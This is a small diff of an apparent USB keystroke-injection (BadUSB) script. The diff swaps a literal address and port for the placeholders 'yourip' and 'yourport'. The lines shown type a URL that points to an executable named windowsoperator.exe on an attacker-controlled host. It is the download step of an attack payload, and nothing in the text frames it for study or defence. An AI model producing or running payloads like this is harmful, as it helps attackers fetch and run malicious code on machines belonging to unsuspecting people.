@@ -19,9 +19,9 @@ STRING http
 SHIFT .
 SHIFT 7
 SHIFT 7
-STRING ip
+STRING yourip
 SHIFT .
-STRING 900
+STRING yourport
 SHIFT 7
 STRING windowsoperator.exe
 SHIFT 2
